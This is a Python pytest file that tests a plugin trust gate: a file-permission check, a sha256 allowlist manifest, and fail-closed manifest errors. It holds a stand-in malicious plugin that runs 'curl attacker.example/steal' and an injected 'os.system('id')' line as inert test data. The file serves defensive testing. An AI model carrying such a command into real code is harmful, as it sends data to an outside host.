"""Tests for the plugin integrity gate.

Loading a plugin executes it, and the loaders pick candidates by filename glob
off a shared writable volume. These pin the two checks that stand between "a
file appeared in the volume" and "that file runs as the API process".
"""
import json

import pytest

from citadel_contracts import PluginTrustStore, sha256_file

PLUGIN_SRC = "PLUGIN_NAME = 'x'\n"


@pytest.fixture
def plugin(tmp_path):
    root = tmp_path / "babel"
    root.mkdir()
    p = root / "demo_plugin.py"
    p.write_text(PLUGIN_SRC)
    p.chmod(0o644)
    return root, p


# ── file mode (always enforced) ───────────────────────────────────────────────

def test_owner_writable_plugin_is_allowed(plugin, monkeypatch):
    root, p = plugin
    monkeypatch.delenv("PLUGIN_TRUST_MANIFEST", raising=False)
    assert PluginTrustStore().allows(p, root) is True


@pytest.mark.parametrize("mode", [0o664, 0o646, 0o666, 0o777])
def test_group_or_world_writable_plugin_is_rejected(plugin, monkeypatch, mode):
    """On a shared volume this is the difference between 'the operator
    installed it' and 'anything on the box could have rewritten it'."""
    root, p = plugin
    monkeypatch.delenv("PLUGIN_TRUST_MANIFEST", raising=False)
    p.chmod(mode)
    assert PluginTrustStore().allows(p, root) is False


def test_mode_check_applies_even_when_allowlisted(plugin, tmp_path, monkeypatch):
    root, p = plugin
    manifest = tmp_path / "trust.json"
    manifest.write_text(json.dumps({"plugins": {"demo_plugin.py": sha256_file(p)}}))
    monkeypatch.setenv("PLUGIN_TRUST_MANIFEST", str(manifest))
    p.chmod(0o666)
    assert PluginTrustStore().allows(p, root) is False


# ── sha256 allowlist (enforced when a manifest is configured) ─────────────────

def test_unenforced_without_a_manifest(plugin, monkeypatch):
    root, p = plugin
    monkeypatch.delenv("PLUGIN_TRUST_MANIFEST", raising=False)
    store = PluginTrustStore()
    assert store.enforcing is False
    assert store.allows(p, root) is True


def test_allowlisted_digest_is_loaded(plugin, tmp_path, monkeypatch):
    root, p = plugin
    manifest = tmp_path / "trust.json"
    manifest.write_text(json.dumps({"plugins": {"demo_plugin.py": sha256_file(p)}}))
    monkeypatch.setenv("PLUGIN_TRUST_MANIFEST", str(manifest))
    store = PluginTrustStore()
    assert store.enforcing is True
    assert store.allows(p, root) is True


def test_unlisted_plugin_is_rejected(plugin, tmp_path, monkeypatch):
    """The attack: drop malware_plugin.py into the volume and wait for load()."""
    root, p = plugin
    evil = root / "malware_plugin.py"
    evil.write_text("import os; os.system('curl attacker.example/steal')\n")
    evil.chmod(0o644)
    manifest = tmp_path / "trust.json"
    manifest.write_text(json.dumps({"plugins": {"demo_plugin.py": sha256_file(p)}}))
    monkeypatch.setenv("PLUGIN_TRUST_MANIFEST", str(manifest))
    store = PluginTrustStore()
    assert store.allows(p, root) is True
    assert store.allows(evil, root) is False


def test_modified_plugin_is_rejected(plugin, tmp_path, monkeypatch):
    """Tampering with an approved plugin must invalidate it."""
    root, p = plugin
    manifest = tmp_path / "trust.json"
    manifest.write_text(json.dumps({"plugins": {"demo_plugin.py": sha256_file(p)}}))
    monkeypatch.setenv("PLUGIN_TRUST_MANIFEST", str(manifest))
    store = PluginTrustStore()
    assert store.allows(p, root) is True
    p.write_text(PLUGIN_SRC + "import os; os.system('id')\n")
    assert store.allows(p, root) is False


def test_nested_plugin_path_matches_manifest_key(tmp_path, monkeypatch):
    root = tmp_path / "babel"
    (root / "evtx").mkdir(parents=True)
    p = root / "evtx" / "evtx_plugin.py"
    p.write_text(PLUGIN_SRC)
    p.chmod(0o644)
    manifest = tmp_path / "trust.json"
    manifest.write_text(json.dumps({"plugins": {"evtx/evtx_plugin.py": sha256_file(p)}}))
    monkeypatch.setenv("PLUGIN_TRUST_MANIFEST", str(manifest))
    assert PluginTrustStore().allows(p, root) is True


def test_plugin_outside_the_root_is_rejected(plugin, tmp_path, monkeypatch):
    root, p = plugin
    outside = tmp_path / "elsewhere_plugin.py"
    outside.write_text(PLUGIN_SRC)
    outside.chmod(0o644)
    monkeypatch.delenv("PLUGIN_TRUST_MANIFEST", raising=False)
    assert PluginTrustStore().allows(outside, root) is False


# ── manifest handling fails closed ────────────────────────────────────────────

def test_missing_manifest_file_is_fatal(tmp_path, monkeypatch):
    """Configured-but-absent must not degrade to 'load everything'."""
    monkeypatch.setenv("PLUGIN_TRUST_MANIFEST", str(tmp_path / "nope.json"))
    with pytest.raises(RuntimeError, match="does not exist"):
        PluginTrustStore()


def test_malformed_manifest_is_fatal(tmp_path, monkeypatch):
    manifest = tmp_path / "trust.json"
    manifest.write_text("{not json")
    monkeypatch.setenv("PLUGIN_TRUST_MANIFEST", str(manifest))
    with pytest.raises(RuntimeError, match="unreadable or malformed"):
        PluginTrustStore()


def test_manifest_with_wrong_shape_is_fatal(tmp_path, monkeypatch):
    manifest = tmp_path / "trust.json"
    manifest.write_text(json.dumps({"plugins": ["demo_plugin.py"]}))
    monkeypatch.setenv("PLUGIN_TRUST_MANIFEST", str(manifest))
    with pytest.raises(RuntimeError):
        PluginTrustStore()


def test_sha256_file_matches_hashlib(plugin):
    import hashlib
    _, p = plugin
    assert sha256_file(p) == hashlib.sha256(p.read_bytes()).hexdigest()
